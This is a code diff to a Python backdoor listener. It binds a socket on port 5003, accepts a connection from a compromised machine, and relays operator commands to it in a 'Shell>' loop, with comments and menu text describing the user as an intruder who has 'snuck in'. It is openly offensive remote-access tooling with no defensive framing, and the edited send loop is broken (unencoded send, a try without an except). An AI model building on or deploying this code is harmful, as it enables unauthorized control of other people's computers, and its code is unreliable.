@@ -20,7 +20,8 @@ def create_socket(): # Inizialize the socket
         SERVER_HOST = '0.0.0.0' # Server IP
         SERVER_PORT = 5003      # Server Port
         BUFFER_SIZE = 1024      # Buffer Size
-        s = socket.socket()
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     except socket.error as e :
         cprint(" Socket creation failed: ", 'red' +str(e))
@@ -39,7 +40,7 @@ def socket_bind(): # Socket binding
         s.bind((SERVER_HOST, SERVER_PORT))
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.listen(5)
-        print(f" Binding socket to port : " + str(SERVER_PORT) + "\n")
+        print(f" [+] Listening for connections on port : " + str(SERVER_PORT) + "\n")
 
     except socket.error as e :
                 cprint(" Socket binding failed: ", 'red' + str(e)+"\nRetrying...", 'red')
@@ -53,7 +54,7 @@ def accept_conn(): # Accept backdoor connection
 
     client_conn, client_addr = s.accept()
     
-    print(" Connection has been established ! | " + "IP: " + client_addr[0] + " Port: " + str(client_addr[1] ) + "\n")
+    print(" [+] Connection has been established ! | " + "IP: " + client_addr[0] + " Port: " + str(client_addr[1] ) + "\n")
     send_commands(client_conn)
 
 
@@ -61,17 +62,19 @@ def send_commands(client_conn): # Send commands
     
     while True:
     
-        command = input(" INTRUDER:")
+        command = input(" Shell> ")
     
-        client_conn.send(command.encode())
 
-        if command.lower() == "exit":
+        if command == "exit":
             
             break
-    
-        results = client_conn.recv(BUFFER_SIZE).decode()
-    
-        print(results)
+
+        else:
+            try:
+                client_conn.send(command)
+                results = client_conn.recv(1024)
+                s.settimeout(2)
+                print(results)
 
     client_conn.close()
     s.close()        
@@ -107,9 +110,9 @@ def mainmenu():
     elif opt == '2':
         os.system('cls')
         banner()
-        cprint(" -- WHILE YOU ARE SNUCK IN THESE ARE THE COMMANDS --\n", 'magenta')
-        print(" exit - Back to main menu\n")
-
+        cprint(" -- WHILE YOU ARE IN SHELL THESE ARE THE COMMANDS --\n", 'magenta')
+        print(" exit - Close connection and go back to main menu\n")
+        
         bacon = input(' Press 1 to go back main menu : ')
         if bacon == '1':
             os.system('cls')
